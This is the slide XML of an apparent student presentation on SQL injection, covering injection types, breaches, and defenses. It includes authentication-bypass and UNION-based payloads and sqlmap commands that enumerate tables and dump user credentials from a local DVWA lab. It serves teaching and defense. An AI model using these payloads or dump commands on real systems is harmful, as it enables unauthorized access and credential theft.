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561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64008" cy="12801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Injection Attack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Study on Web Security's Most Persistent Threat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657600" cy="22860"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="B2D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 |  IIT Jodhpur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Members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Khushi Bawistale  (G25AIT2052)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Shashank Jangid  (G25AIT2100)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Rajath S M  (G25AIT2079)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Siddhant Singh  (G25AIT2105)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Deepanshu Arora  (G25AIT2029)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Soumya A  (G25AIT2111)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Shah Tirth Rajeshkumar  (G25AIT2121)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61288"/>
            <a:ext cx="274320" cy="274320"/>
          </a:xfrm>
          <a:prstGeom prst="ellipse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SQL Injection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499616"/>
            <a:ext cx="274320" cy="274320"/>
          </a:xfrm>
          <a:prstGeom prst="ellipse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48132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SQL Injection Works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1837944"/>
            <a:ext cx="274320" cy="274320"/>
          </a:xfrm>
          <a:prstGeom prst="ellipse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181965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SQL Injection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274320" cy="274320"/>
          </a:xfrm>
          <a:prstGeom prst="ellipse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215798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Breaches &amp; Impact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2514600"/>
            <a:ext cx="274320" cy="274320"/>
          </a:xfrm>
          <a:prstGeom prst="ellipse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249631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Methodology Deep Dive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2852928"/>
            <a:ext cx="274320" cy="274320"/>
          </a:xfrm>
          <a:prstGeom prst="ellipse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28346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Demo Environment Setup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191256"/>
            <a:ext cx="274320" cy="274320"/>
          </a:xfrm>
          <a:prstGeom prst="ellipse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" y="317296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Manual SQL Injection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3529584"/>
            <a:ext cx="274320" cy="274320"/>
          </a:xfrm>
          <a:prstGeom prst="ellipse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" y="35112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Automated Attack with SQLMap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3867912"/>
            <a:ext cx="274320" cy="274320"/>
          </a:xfrm>
          <a:prstGeom prst="ellipse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" y="3849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Countermeasures &amp; Defense Strategies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4206240"/>
            <a:ext cx="274320" cy="274320"/>
          </a:xfrm>
          <a:prstGeom prst="ellipse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" y="418795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Best Practices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" y="4544568"/>
            <a:ext cx="274320" cy="274320"/>
          </a:xfrm>
          <a:prstGeom prst="ellipse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" y="45262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References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SQL Injection?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303520" cy="15544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" cy="15544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16276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(SQLi) is a code injection technique that exploits vulnerabilities in an application's database layer. Attackers insert malicious SQL statements into input fields, tricking the application into executing unintended commands on the database.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1097280"/>
            <a:ext cx="2560320" cy="685800"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="E6F5F6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63640" y="11155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31520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data breaches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1920240"/>
            <a:ext cx="2560320" cy="685800"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="E6F5F6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63640" y="193852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2,600+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498080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CVEs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Attack Flows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337560"/>
            <a:ext cx="1920240" cy="12801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4290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008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008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 malicious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payload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749040"/>
            <a:ext cx="201168" cy="20116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2743200" y="3337560"/>
            <a:ext cx="1920240" cy="12801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34290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83464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283464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unsanitized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query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749040"/>
            <a:ext cx="201168" cy="20116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937760" y="3337560"/>
            <a:ext cx="1920240" cy="12801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342900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2920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02920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SQL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3749040"/>
            <a:ext cx="201168" cy="20116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7132320" y="3337560"/>
            <a:ext cx="1920240" cy="12801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3429000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22376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Leaked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722376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SQL Injection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1A9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52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Login Query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691640"/>
            <a:ext cx="3474720" cy="36576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9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input:  admin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148840"/>
            <a:ext cx="3474720" cy="64008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 = 'admin'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E8870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801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252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Injected Malicious Query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02920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87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input:  ' OR '1'='1' --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37760" y="2148840"/>
            <a:ext cx="3474720" cy="64008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02920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87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name='' OR '1'='1' --'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This Work?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48640" y="3611880"/>
            <a:ext cx="804672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concatenates user input directly into the SQL query string without sanitization.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injected  ' OR '1'='1'  condition always evaluates to TRUE, returning all rows.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 dash  --  comments out the remaining SQL, preventing syntax errors.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SQL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6118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325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In-Band SQLi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type. Results are visible directly in the web response.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24688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45720" cy="8229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Error-Based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DB errors to leak schema info such as table and column names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3749040"/>
            <a:ext cx="24688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45720" cy="8229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3794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Union-Based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UNION operator to combine malicious results with legitimate query output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37560" y="1097280"/>
            <a:ext cx="2651760" cy="36118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2588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2900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SQLi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347472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output. Data inferred from app behavior or response timing.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429000" y="2788920"/>
            <a:ext cx="24688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429000" y="2788920"/>
            <a:ext cx="45720" cy="82296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56616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Boolean-Based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5661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true/false conditions and infers data from application behavior changes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429000" y="3749040"/>
            <a:ext cx="24688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3429000" y="3749040"/>
            <a:ext cx="45720" cy="82296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3566160" y="3794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Time-Based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56616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SLEEP / WAITFOR to detect conditions via response time differences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217920" y="1097280"/>
            <a:ext cx="2651760" cy="36118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E8870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325880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30936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8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Out-of-Band SQLi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635508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exfiltrated via a separate channel such as DNS or HTTP.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309360" y="2788920"/>
            <a:ext cx="24688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6309360" y="2788920"/>
            <a:ext cx="45720" cy="822960"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="E887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44652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DNS Exfiltration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446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initiates DNS lookup to attacker-controlled server carrying data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6309360" y="3749040"/>
            <a:ext cx="24688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6309360" y="3749040"/>
            <a:ext cx="45720" cy="822960"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="E887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6446520" y="3794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Channel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644652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sends HTTP request with extracted data to external endpoint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Breaches &amp;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" cy="8229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280160"/>
            <a:ext cx="685800" cy="457200"/>
          </a:xfrm>
          <a:prstGeom prst="rect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117043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MOVEit File Transfer Breach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4813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SQLi exploitation in a managed file transfer application. Thousands of organizations impacted globally, stolen data sold on dark web.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54864" cy="82296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2240280"/>
            <a:ext cx="685800" cy="457200"/>
          </a:xfrm>
          <a:prstGeom prst="rect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2402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213055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BeyondTrust + PostgreSQL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24414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SQLi in BeyondTrust PRA/RS products combined with PostgreSQL vulnerability (CVE-2025-1094). Targeted US government agencies.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54864" cy="822960"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="E887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3200400"/>
            <a:ext cx="685800" cy="457200"/>
          </a:xfrm>
          <a:prstGeom prst="rect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2004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309067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Retail Chain Breach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34015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exploited SQL injection to extract credit card data and personal details of millions of customers from a major retailer.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54864" cy="8229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4160520"/>
            <a:ext cx="685800" cy="457200"/>
          </a:xfrm>
          <a:prstGeom prst="rect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1605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405079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GenAI-Generated Code Vulnerability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45920" y="43616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startup deployed AI-generated code with unvalidated SQL queries. 3,200 user records exposed within 48 hours of launch.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Methodology Deep Dive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658368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16128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161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19786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10642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Reconnaissance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7360" y="13807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input fields that interact with the database (login forms, search bars, URL parameters, cookies).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828800"/>
            <a:ext cx="8046720" cy="658368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" y="193852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580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975104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1883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Detection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737360" y="21579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special characters (single quotes, semicolons) and observe error messages or behavioral changes.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2606040"/>
            <a:ext cx="8046720" cy="658368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85800" y="271576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85800" y="2715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2752344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266090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Exploitation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737360" y="293522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payloads to extract data, bypass authentication, or manipulate database records using UNION, subqueries, or stacked queries.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3383280"/>
            <a:ext cx="8046720" cy="658368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85800" y="349300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85800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3529584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37360" y="34381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Privilege Escalation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737360" y="37124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read system tables, access admin credentials, or execute OS commands via database functions like xp_cmdshell.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4160520"/>
            <a:ext cx="8046720" cy="658368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85800" y="427024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85800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4306824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737360" y="42153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Exfiltration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1737360" y="448970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sensitive data (credentials, PII, financial records) through in-band responses, error messages, or out-of-band channels.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Vulnerable vs. Secure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54864"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="E8870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618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Vulnerable Code (PHP) - Direct String Concatenation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1691640"/>
            <a:ext cx="7680960" cy="73152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17373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$username = $_GET['user'];  // Unsanitized input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87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$query = "SELECT * FROM users WHERE name='" . $username . "'";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$result = mysqli_query($conn, $query);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8046720" cy="146304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8640" y="2788920"/>
            <a:ext cx="8046720" cy="54864"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="1A9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71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9535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Code (PHP) - Parameterized Query / Prepared Statement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1520" y="3383280"/>
            <a:ext cx="7680960" cy="73152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68680" y="34290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9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$pdo-&gt;prepare("SELECT * FROM users WHERE name = ?");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9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$stmt-&gt;execute([$_GET['user']]);  // Input treated as data, not code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9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$result = $stmt-&gt;fetchAll();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4805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separate SQL logic from user data, making injection structurally impossible.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Demo Environment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" cy="18288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207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Required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16459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Damn Vulnerable Web Application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SQL injection testing tool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(optional)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interception &amp; analysis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097280"/>
            <a:ext cx="3749040" cy="182880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1097280"/>
            <a:ext cx="54864" cy="18288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344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207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Setup (Docker)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074920" y="1691640"/>
            <a:ext cx="3291840" cy="109728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212080" y="1737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pull vulnerables/web-dvwa
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-p 80:80 \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vulnerables/web-dvwa
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http://localhost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Login: admin / password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Steps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3566160"/>
            <a:ext cx="260604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40080" y="36393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4008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097280" y="3639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to DVWA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8580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credentials: admin / password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83280" y="3566160"/>
            <a:ext cx="260604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474720" y="36393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47472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3931920" y="3639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Security Level to LOW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52044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Security tab  &gt;  select Low  &gt;  Submit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217920" y="3566160"/>
            <a:ext cx="260604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6309360" y="36393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30936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766560" y="3639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Navigate to SQL Injection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35508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Left-side menu  &gt;  SQL Injection module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Manual SQL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Authentication Bypass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399032"/>
            <a:ext cx="6400800" cy="2286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39903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'1'='1' --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66420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user records, bypasses authentication check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39112"/>
            <a:ext cx="8046720" cy="8686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039112"/>
            <a:ext cx="54864" cy="86868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0848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Determine Column Count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2386584"/>
            <a:ext cx="6400800" cy="2286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38658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ORDER BY 1--   ' ORDER BY 2--  ...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65176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until error appears to reveal the number of columns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26664"/>
            <a:ext cx="8046720" cy="8686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026664"/>
            <a:ext cx="54864" cy="8686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072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UNION-Based Data Extraction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374136"/>
            <a:ext cx="6400800" cy="2286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37413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UNION SELECT user, password FROM users--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63931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 usernames and password hashes from the users table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14216"/>
            <a:ext cx="8046720" cy="8686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54864" cy="86868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40599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Database Fingerprinting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4361688"/>
            <a:ext cx="6400800" cy="2286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36168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UNION SELECT @@version, NULL--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62686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database engine type and version (MySQL, MSSQL, etc.)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SQLMap Automation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841248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124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10642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Injection Point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1399032"/>
            <a:ext cx="7223760" cy="2286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139903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sqlmap -u "http://localhost/dvwa/vulnerabilities/sqli/?id=1&amp;Submit=Submit" --cookie="..."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165506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tests the id parameter for SQL injection vulnerabilities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8046720" cy="841248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208483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0665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Enumerate Databases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88720" y="2359152"/>
            <a:ext cx="7223760" cy="2286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80160" y="235915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sqlmap -u "..." --cookie="..." --dbs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261518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databases on the server (e.g., dvwa, information_schema)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8046720" cy="841248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304495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0266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Tables in DVWA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88720" y="3319272"/>
            <a:ext cx="7223760" cy="2286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80160" y="331927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sqlmap -u "..." --cookie="..." -D dvwa --tables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88720" y="357530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tables in the dvwa database: guestbook, users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8046720" cy="841248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" y="400507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39867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Dump User Credentials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188720" y="4279392"/>
            <a:ext cx="7223760" cy="2286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80160" y="42793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sqlmap -u "..." --cookie="..." -D dvwa -T users --dump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88720" y="453542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all usernames and password hashes, offers to auto-crack them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05840" y="4617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Countermeasures: Primary Defenses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234440"/>
            <a:ext cx="777240" cy="228600"/>
          </a:xfrm>
          <a:prstGeom prst="rect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35240" y="1234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371600" y="12070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Parameterized Queries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1645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prepared statements that separate SQL logic from user-supplied data. This is the #1 defense recommended by OWASP. User input is always treated as data, never as executable code.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331720"/>
            <a:ext cx="8046720" cy="10972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2331720"/>
            <a:ext cx="54864" cy="10972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68880"/>
            <a:ext cx="411480" cy="411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635240" y="2468880"/>
            <a:ext cx="777240" cy="228600"/>
          </a:xfrm>
          <a:prstGeom prst="rect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635240" y="24688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1371600" y="24414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 &amp; Whitelisting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77240" y="2880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user inputs against expected patterns. Use whitelists for acceptable characters and formats. Enforce strict type checks and length limits on every input field.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48640" y="3566160"/>
            <a:ext cx="54864" cy="10972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03320"/>
            <a:ext cx="411480" cy="4114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635240" y="3703320"/>
            <a:ext cx="777240" cy="228600"/>
          </a:xfrm>
          <a:prstGeom prst="rect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7635240" y="3703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1371600" y="36758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ORM Frameworks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Object-Relational Mappers such as SQLAlchemy, Hibernate, or Django ORM. These enforce parameterized queries by default, significantly reducing the attack surface.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Countermeasures: Secondary Defenses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234440"/>
            <a:ext cx="1051560" cy="228600"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="F0ED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60920" y="12344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371600" y="12070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Least Privilege Principle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1645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accounts used by applications should have minimal permissions. Avoid granting DROP, ALTER, or administrative access to application-level accounts.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331720"/>
            <a:ext cx="8046720" cy="10972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2331720"/>
            <a:ext cx="54864" cy="109728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68880"/>
            <a:ext cx="411480" cy="411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360920" y="2468880"/>
            <a:ext cx="1051560" cy="228600"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="F0ED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360920" y="24688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1371600" y="244144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Application Firewall (WAF)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77240" y="2880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WAFs inspect HTTP traffic and block requests containing SQLi attack patterns. Useful as an additional layer for legacy applications, but not a standalone solution.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48640" y="3566160"/>
            <a:ext cx="54864" cy="109728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03320"/>
            <a:ext cx="411480" cy="4114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360920" y="3703320"/>
            <a:ext cx="1051560" cy="228600"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="F0ED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7360920" y="37033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1371600" y="367588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 Security Testing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SAST/DAST scans, penetration testing, and code reviews regularly. Use tools like SQLMap, Burp Suite, and OWASP ZAP to identify vulnerabilities before attackers do.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Coding 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023360" cy="114300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4864" cy="1143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trust user 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4904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all input (form fields, URL parameters, cookies, HTTP headers) as potentially malicious. Validate and sanitize everything.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4023360" cy="114300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4864" cy="1143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parameterized queries everywhere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706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 interaction must use prepared statements or parameterized queries, with no exceptions for "simple" queries.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4023360" cy="114300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4864" cy="1143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the principle of least privilege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0507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should connect to the database with the minimum permissions required for its functionality.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051560"/>
            <a:ext cx="4023360" cy="114300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1051560"/>
            <a:ext cx="54864" cy="1143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 proper error handling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14904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 database error messages to end users. Use generic error pages and log detailed errors server-side only.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331720"/>
            <a:ext cx="4023360" cy="114300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2331720"/>
            <a:ext cx="54864" cy="1143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frameworks and libraries updated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7706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update your tech stack. Many SQLi vulnerabilities exist in outdated framework versions and third-party libraries.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611880"/>
            <a:ext cx="4023360" cy="114300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3611880"/>
            <a:ext cx="54864" cy="1143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AI-generated code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40507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generated by AI tools may contain SQLi vulnerabilities. Always review and test generated code before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2286000" cy="274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4864" cy="5486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972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24128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is over 25 years old yet remains in the OWASP Top 10 and caused 26% of breaches in 2024.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1645920"/>
            <a:ext cx="54864" cy="5486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373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664208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vulnerable input field can compromise an entire database, leading to data theft, manipulation, or destruction.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48640" y="2286000"/>
            <a:ext cx="54864" cy="5486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3774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304288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are the most effective defense and should be the standard for all database interactions.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48640" y="2926080"/>
            <a:ext cx="54864" cy="5486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0175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2944368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is essential: combine prepared statements, input validation, WAFs, least privilege, and security testing.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solidFill>
            <a:srgbClr val="F7F8FA"/>
          </a:solidFill>
          <a:ln/>
          <a:effectLst>
            <a:outerShdw blurRad="76200" dist="25400" dir="8100000" algn="bl" rotWithShape="0">
              <a:srgbClr val="9AAFC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48640" y="3566160"/>
            <a:ext cx="54864" cy="5486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65760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3584448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 is introducing new SQLi risks. Always audit and test code regardless of its source.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2286000" y="4343400"/>
            <a:ext cx="4572000" cy="502920"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="E6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2286000" y="4343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|  Questions?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1604</Words>
  <Application>Microsoft Macintosh PowerPoint</Application>
  <PresentationFormat>On-screen Show (16:9)</PresentationFormat>
  <Paragraphs>238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Injection Attack - Deep Dive</dc:title>
  <dc:subject>PptxGenJS Presentation</dc:subject>
  <dc:creator>Rajath - IIT Jodhpur</dc:creator>
  <cp:lastModifiedBy>Microsoft Office User</cp:lastModifiedBy>
  <cp:revision>2</cp:revision>
  <dcterms:created xsi:type="dcterms:W3CDTF">2026-05-26T08:48:42Z</dcterms:created>
  <dcterms:modified xsi:type="dcterms:W3CDTF">2026-05-26T08:58:26Z</dcterms:modified>
</cp:coreProperties>
</file>